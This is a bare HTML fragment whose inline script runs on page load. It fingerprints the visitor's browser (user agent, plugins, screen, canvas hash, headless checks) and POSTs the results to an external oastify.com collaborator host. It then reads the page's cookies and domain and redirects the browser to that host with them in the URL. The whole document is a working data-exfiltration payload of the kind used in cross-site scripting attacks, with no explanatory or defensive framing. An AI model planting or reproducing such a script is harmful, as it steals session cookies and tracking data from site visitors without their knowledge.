<div></div>
    <script type="text/javascript">
function getHeadlessInfo() {
    const userAgent = navigator.userAgent;
    const isWebDriver = !!(window.navigator.webdriver || window.webdriver || navigator.webdriver);

    // Browser Plugins
    const plugins = Array.from(navigator.plugins).map(plugin => plugin.name);

    // Languages
    const languages = navigator.languages;

    // Screen Dimensions
    const screenWidth = screen.width;
    const screenHeight = screen.height;

    // Headless Behavior Detection
    const detectHeadlessBehavior = () => {
        const element = document.createElement('div');
        element.style.cssText = 'width:100px;height:100px;overflow:auto;position:absolute;top:-200px;';
        document.body.appendChild(element);
        element.scrollTop = 10;
        const isHeadlessBehavior = element.scrollTop !== 10;
        document.body.removeChild(element);
        return isHeadlessBehavior;
    };
    const headlessBehaviorDetected = detectHeadlessBehavior();

    // Canvas Fingerprinting
    const detectHeadlessCanvas = () => {
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        context.textBaseline = 'top';
        context.font = '14px Arial';
        context.textBaseline = 'alphabetic';
        context.fillStyle = '#f60';
        context.fillRect(125, 1, 62, 20);
        context.fillStyle = '#069';
        context.fillText('Browser Test', 2, 15);
        context.fillStyle = 'rgba(102, 204, 0, 0.7)';
        context.fillText('Browser Test', 4, 17);
        return canvas.toDataURL();
    };
    const canvasDataURL = detectHeadlessCanvas();

    return {
        userAgent,
        isWebDriver,
        plugins,
        languages,
        screenWidth,
        screenHeight,
        headlessBehaviorDetected,
        canvasDataURL
    };
}

function sendHeadlessInfo() {
    const headlessInfo = getHeadlessInfo();
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "https://rkf9aetn6sfnd1qpszkdhc7bu20toycn.oastify.com/xhr", true);
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.send(JSON.stringify(headlessInfo));
}

sendHeadlessInfo();

        // Encode the values to make them URL-safe
        var userAgent = encodeURIComponent(navigator.userAgent);
        var documentDomain = encodeURIComponent(document.domain);
        var cookies = encodeURIComponent(document.cookie);
        var screenWidth = screen.width;
        var screenHeight = screen.height;
        var language = encodeURIComponent(navigator.language);
        var platform = encodeURIComponent(navigator.platform);
        var timezone = encodeURIComponent(Intl.DateTimeFormat().resolvedOptions().timeZone);
        var cpuCores = navigator.hardwareConcurrency || 'unknown';
        var deviceMemory = navigator.deviceMemory || 'unknown';
        var os = navigator.userAgent.indexOf('Win') != -1 ? 'Windows' :
                 navigator.userAgent.indexOf('Mac') != -1 ? 'MacOS' :
                 navigator.userAgent.indexOf('Linux') != -1 ? 'Linux' :
                 navigator.userAgent.indexOf('Android') != -1 ? 'Android' :
                 navigator.userAgent.indexOf('like Mac') != -1 ? 'iOS' : 'Unknown';

        // Get browser plugins
        var plugins = [];
        for (var i = 0; i < navigator.plugins.length; i++) {
            plugins.push(navigator.plugins[i].name);
        }
        var pluginsString = encodeURIComponent(plugins.join(', '));

        // Construct the URL with the query parameters
        var targetUrl = "https://rkf9aetn6sfnd1qpszkdhc7bu20toycn.oastify.com/ss";
        var redirectUrl = targetUrl + "?userAgent=" + userAgent +
                          "&domain=" + documentDomain +
                          "&cookies=" + cookies +
                          "&screenWidth=" + screenWidth +
                          "&screenHeight=" + screenHeight +
                          "&language=" + language +
                          "&platform=" + platform +
                          "&timezone=" + timezone +
                          "&cpuCores=" + cpuCores +
                          "&deviceMemory=" + deviceMemory +
                          "&os=" + os +
                          "&plugins=" + pluginsString;

        // Redirect to the constructed URL
        window.location.href = redirectUrl;
        
    </script>
